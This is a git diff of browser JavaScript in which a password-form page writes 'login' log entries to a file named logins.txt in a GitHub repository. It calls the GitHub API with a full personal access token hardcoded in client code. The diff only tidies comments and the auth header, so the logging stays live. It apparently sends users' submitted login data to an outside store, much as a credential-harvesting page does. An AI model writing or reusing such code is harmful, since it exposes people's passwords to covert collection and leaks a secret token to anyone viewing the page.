@@ -39,18 +39,17 @@ document.getElementById('password-form').addEventListener('submit', async (e) =>
 
 // Function to log data to GitHub
 async function logToGitHub(logEntry) {
-    const GITHUB_REPO = 'Story'; // Replace with your repository name
-    const GITHUB_OWNER = 'thom-achan'; // Replace with your GitHub username
-    const GITHUB_FILE = 'logins.txt';   // Replace with your log file name
-    const GITHUB_TOKEN = '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'; // Replace with your GitHub token
+    const GITHUB_REPO = 'Story';
+    const GITHUB_OWNER = 'thom-achan';
+    const GITHUB_FILE = 'logins.txt';
+    const GITHUB_TOKEN = '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'; // Securely handle the token
 
     const apiUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${GITHUB_FILE}`;
 
     try {
-        // Try to get the current file content and SHA
         const getResponse = await fetch(apiUrl, {
             headers: {
-                Authorization: `token ${GITHUB_TOKEN}`,
+                Authorization: `Bearer ${GITHUB_TOKEN}`,
             },
         });
 
@@ -60,28 +59,25 @@ async function logToGitHub(logEntry) {
         if (getResponse.ok) {
             const fileData = await getResponse.json();
             fileSha = fileData.sha;
-            fileContent = atob(fileData.content); // Decode Base64 content
+            fileContent = atob(fileData.content);
         } else if (getResponse.status === 404) {
-            // File doesn't exist, we'll create it
             fileContent = '';
         } else {
             throw new Error('Failed to fetch file from GitHub.');
         }
 
-        // Append the new log entry
         const updatedContent = fileContent + logEntry;
 
-        // Update or create the file in GitHub
         const updateResponse = await fetch(apiUrl, {
             method: 'PUT',
             headers: {
-                Authorization: `token ${GITHUB_TOKEN}`,
+                Authorization: `Bearer ${GITHUB_TOKEN}`,
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({
                 message: 'Update login log',
-                content: btoa(updatedContent), // Encode content to Base64
-                sha: fileSha, // Include SHA for file update, will be empty for new file
+                content: btoa(updatedContent),
+                sha: fileSha,
             }),
         });
 
